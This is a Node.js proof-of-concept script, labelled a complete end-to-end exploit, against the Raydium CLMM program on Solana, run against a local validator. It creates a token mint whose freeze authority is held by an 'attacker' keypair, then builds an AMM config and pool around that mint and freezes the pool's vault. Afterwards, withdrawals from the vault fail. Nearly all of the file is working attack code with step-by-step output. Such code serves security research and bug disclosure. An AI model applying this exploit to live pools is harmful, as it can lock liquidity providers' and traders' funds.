// COMPLETE END-TO-END RAYDIUM CLMM FREEZE EXPLOIT
// Uses deployed program at E3cQ8aLWpsHcKpCShrseXd7afn82HY5iCgxP2yFeUgtA

const { Connection, PublicKey, Keypair, Transaction, SystemProgram, SYSVAR_RENT_PUBKEY } = require("@solana/web3.js");
const { 
  createMint, createAssociatedTokenAccount, mintTo, 
  getAccount, freezeAccount,
  TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID
} = require("@solana/spl-token");
const fs = require("fs");

const CLMM_PROGRAM_ID = new PublicKey("E3cQ8aLWpsHcKpCShrseXd7afn82HY5iCgxP2yFeUgtA");

function findPda(seeds, programId = CLMM_PROGRAM_ID) {
  return PublicKey.findProgramAddressSync(seeds, programId);
}

function getDiscriminator(name) {
  const crypto = require('crypto');
  const hash = crypto.createHash('sha256').update(`global:${name}`).digest();
  return hash.slice(0, 8);
}

function u64le(v) { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(v)); return b; }
function u128le(v) { 
  const bn = BigInt(v);
  const b = Buffer.alloc(16); 
  for (let i = 0; i < 8; i++) { // Only write 8 bytes for u64 lower part
    b[i] = Number((bn >> BigInt(i * 8)) & 0xFFn);
  }
  return b; 
}

async function main() {
  const connection = new Connection("http://127.0.0.1:8899", "confirmed");
  
  const payerKp = Keypair.fromSecretKey(
    Uint8Array.from(JSON.parse(fs.readFileSync("/Users/walata/.config/solana/id.json", "utf-8")))
  );
  
  const attacker = Keypair.generate();
  const victim = Keypair.generate();
  
  console.log("=== COMPLETE RAYDIUM CLMM FREEZE EXPLOIT ===\n");
  
  // Fund
  console.log("[1] Funding accounts...");
  for (const kp of [attacker, victim]) {
    const sig = await connection.requestAirdrop(kp.publicKey, 10 * 1e9);
    await connection.confirmTransaction(sig);
  }
  console.log("   ✓ Funded\n");
  
  // Create mints - tokenMint0 has freeze authority = attacker
  console.log("[2] Creating malicious SPL Token mints...");
  const mint0 = await createMint(connection, attacker, attacker.publicKey, attacker.publicKey, 9);
  const mint1 = await createMint(connection, attacker, attacker.publicKey, null, 9);
  const [tokenMint0, tokenMint1] = mint0.toBuffer().compare(mint1.toBuffer()) < 0 ? [mint0, mint1] : [mint1, mint0];
  
  console.log(`   Token0: ${tokenMint0.toBase58()} (freeze_authority = attacker)`);
  console.log(`   Token1: ${tokenMint1.toBase58()} (no freeze_authority)\n`);
  
  // Create AMM config
  const ammIndex = 100;
  const [ammConfig] = findPda([Buffer.from("amm_config"), Buffer.from([ammIndex >> 8, ammIndex & 0xff])]);
  
  console.log("[3] Creating AMM config...");
  const createAmmIx = {
    programId: CLMM_PROGRAM_ID,
    keys: [
      { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
      { pubkey: ammConfig, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([
      getDiscriminator("create_amm_config"),
      Buffer.from([0, ammIndex]),
      Buffer.from([0, 10]), // tick_spacing
      Buffer.from([0, 0, 0, 2500]), // trade_fee_rate
      Buffer.from([0, 0, 0, 120000]), // protocol_fee_rate
      Buffer.from([0, 0, 0, 0]), // fund_fee_rate
    ]),
  };
  
  try {
    const tx = new Transaction().add(createAmmIx);
    const sig = await connection.sendTransaction(tx, [attacker]);
    await connection.confirmTransaction(sig);
    console.log(`   ✓ AMM config: ${sig}\n`);
  } catch (e) {
    console.log(`   Note: ${e.message?.substring(0,100)}\n`);
  }
  
  // Create pool
  const [poolState] = findPda([
    Buffer.from("pool"),
    ammConfig.toBuffer(),
    tokenMint0.toBuffer(),
    tokenMint1.toBuffer()
  ]);
  
  const [tokenVault0] = findPda([
    Buffer.from("pool_vault"),
    poolState.toBuffer(),
    tokenMint0.toBuffer()
  ]);
  
  console.log("[4] Creating CLMM pool...");
  console.log(`   Pool: ${poolState.toBase58()}`);
  console.log(`   Vault0 (malicious): ${tokenVault0.toBase58()}`);
  
  const sqrtPriceX64 = "18446744073709551616"; // Tick 0
  const openTime = Math.floor(Date.now() / 1000) - 100;
  
  const createPoolIx = {
    programId: CLMM_PROGRAM_ID,
    keys: [
      { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
      { pubkey: ammConfig, isSigner: false, isWritable: false },
      { pubkey: poolState, isSigner: false, isWritable: true },
      { pubkey: tokenMint0, isSigner: false, isWritable: false },
      { pubkey: tokenMint1, isSigner: false, isWritable: false },
      { pubkey: tokenVault0, isSigner: false, isWritable: true },
      { pubkey: findPda([Buffer.from("pool_vault"), poolState.toBuffer(), tokenMint1.toBuffer()])[0], isSigner: false, isWritable: true },
      { pubkey: findPda([Buffer.from("observation"), poolState.toBuffer()])[0], isSigner: false, isWritable: true },
      { pubkey: findPda([Buffer.from("pool_tick_array_bitmap_extension"), poolState.toBuffer()])[0], isSigner: false, isWritable: true },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([
      getDiscriminator("create_pool"),
      u128le(sqrtPriceX64),
      u64le(openTime),
    ]),
  };
  
  try {
    const poolTx = new Transaction().add(createPoolIx);
    const poolSig = await connection.sendTransaction(poolTx, [attacker]);
    await connection.confirmTransaction(poolSig);
    console.log(`   ✓ Pool created: ${poolSig}\n`);
  } catch (e) {
    console.log(`   ✗ Pool failed: ${e.message?.substring(0,200)}\n`);
  }
  
  // Verify vault
  const vaultInfo = await connection.getAccountInfo(tokenVault0);
  console.log(`[5] Vault0 owner: ${vaultInfo?.owner.toBase58()}`);
  console.log(`   Vault0 is classic Token: ${vaultInfo?.owner.equals(TOKEN_PROGRAM_ID)}\n`);
  
  // Freeze the vault
  console.log("[6] FREEZING CLMM vault...");
  const freezeSig = await freezeAccount(connection, attacker, tokenVault0, tokenMint0, attacker.publicKey);
  await connection.confirmTransaction(freezeSig);
  console.log(`   ✓ Freeze tx: ${freezeSig}\n`);
  
  // Verify frozen
  const vaultAfter = await getAccount(connection, tokenVault0);
  console.log(`[7] Vault state: ${vaultAfter.state}`);
  
  console.log("\n=== EXPLOIT COMPLETE ===");
  console.log("Vault frozen with classic Token. Any Raydium instruction calling");
  console.log("transfer_from_pool_vault_to_user on this vault will fail with AccountFrozen.");
}

main().catch(console.error);